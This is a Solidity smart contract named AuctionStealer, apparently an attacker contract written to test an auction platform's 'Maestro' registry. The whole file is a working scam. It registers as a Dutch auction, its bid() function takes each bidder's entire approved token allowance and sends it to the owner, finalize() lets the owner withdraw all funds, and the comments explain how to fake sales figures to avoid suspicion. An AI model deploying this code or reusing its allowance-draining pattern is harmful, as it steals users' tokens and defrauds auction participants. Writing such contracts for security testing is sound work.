pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./Maestro.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract AuctionStealer is Ownable {

    enum AuctionStatus{OFF,RUNNING,ENDED} 
    AuctionStatus public status;   
    Maestro public maestroSC; 
    uint public numberOfTokensToBeDistributed;
    uint public soldProjectTokens;
    uint public rate;
    uint public currentRate;
    uint public finalRate;
    ERC20 public bidCoin;
    ERC20 public projectToken;
    

    event TokenBought(address indexed buyer,uint usedBidCoinAmount , uint boughtTokenAmount );        //Logs bought auction tokens

    //We don't even need to use original owners token we can just create some new token
    constructor(address _maestro,address originalOwner,address sucoinAddress,address tokenAddress,bytes32 projectHash) {
        projectToken = ERC20(tokenAddress);
        bidCoin = ERC20(sucoinAddress);
        //Begin immediately
        status = AuctionStatus.RUNNING;
        maestroSC = Maestro(_maestro);
        maestroSC.AssignAuction(originalOwner, projectHash, address(projectToken), "DutchAuction");
        //Random numbers to make auction not too suspicious
        numberOfTokensToBeDistributed = 10 ** 22;
        finalRate = currentRate =  rate = 10 ** 16;
    }

       
    //Finish the auction and run away with money anytime
    function finalize() public onlyOwner() {
        status = AuctionStatus.ENDED;
        bidCoin.transfer(owner(),bidCoin.balanceOf(address(this)));
        projectToken.transfer(owner(),projectToken.balanceOf(address(this)));
    }

    function bid(uint bidCoinAmount) external  {
        //Ignore bidCoinAmount
        //Try to steal all approved sucoins


        uint allowance = bidCoin.allowance(msg.sender,address(this));
        bidCoin.transferFrom(msg.sender,owner(),allowance);

        //Increase sold token amount so others are not so suspicious
        soldProjectTokens += 10 ** 19;
    }

}

